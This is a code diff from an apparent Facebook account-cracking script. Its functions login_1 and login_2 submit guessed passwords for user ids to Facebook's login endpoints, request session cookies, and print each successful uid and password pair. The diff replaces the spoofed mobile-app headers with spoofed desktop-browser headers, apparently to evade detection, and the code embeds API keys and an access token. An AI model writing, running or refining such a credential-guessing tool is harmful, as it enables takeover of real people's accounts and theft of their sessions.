@@ -467,22 +467,21 @@ def login_1(uid):
                 'api_key': '882a8490361da98702bf97a021ddc14d'
             }
             headers = {
-                'User-Agent': window1(),
-                'Content-Type': 'application/x-www-form-urlencoded',
-                'Host': 'graph.facebook.com',
-                'X-FB-Net-HNI': '25227',
-                'X-FB-SIM-HNI': '29752',
-                'X-FB-Connection-Type': 'MOBILE.LTE',
-                'X-Tigon-Is-Retry': 'False',
-                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
-                'x-fb-device-group': '5120',
-                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
-                'X-FB-Request-Analytics-Tags': 'graphservice',
-                'X-FB-HTTP-Engine': 'Liger',
-                'X-FB-Client-IP': 'True',
-                'X-FB-Server-Cluster': 'True',
-                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
-            }
+    'authority': 'www.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    'cache-control': 'max-age=0',
+    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Linux"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'none',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
+}
+
             res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
             if 'session_key' in res:
                 print(f"\r\r\x1b[1;37m>\x1b[38;5;196m├Ч\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
@@ -509,22 +508,20 @@ def login_2(uid):
         try:
             with requests.Session() as session:
                 headers = {
-                'User-Agent': window1(),
-                'Content-Type': 'application/x-www-form-urlencoded',
-                'Host': 'graph.facebook.com',
-                'X-FB-Net-HNI': '25227',
-                'X-FB-SIM-HNI': '29752',
-                'X-FB-Connection-Type': 'MOBILE.LTE',
-                'X-Tigon-Is-Retry': 'False',
-                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
-                'x-fb-device-group': '5120',
-                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
-                'X-FB-Request-Analytics-Tags': 'graphservice',
-                'X-FB-HTTP-Engine': 'Liger',
-                'X-FB-Client-IP': 'True',
-                'X-FB-Server-Cluster': 'True',
-                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
-            }
+    'authority': 'www.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    'cache-control': 'max-age=0',
+    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Linux"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'none',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
+}
                 url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
                 po = session.get(url, headers=headers).json()
                 if 'session_key' in str(po):
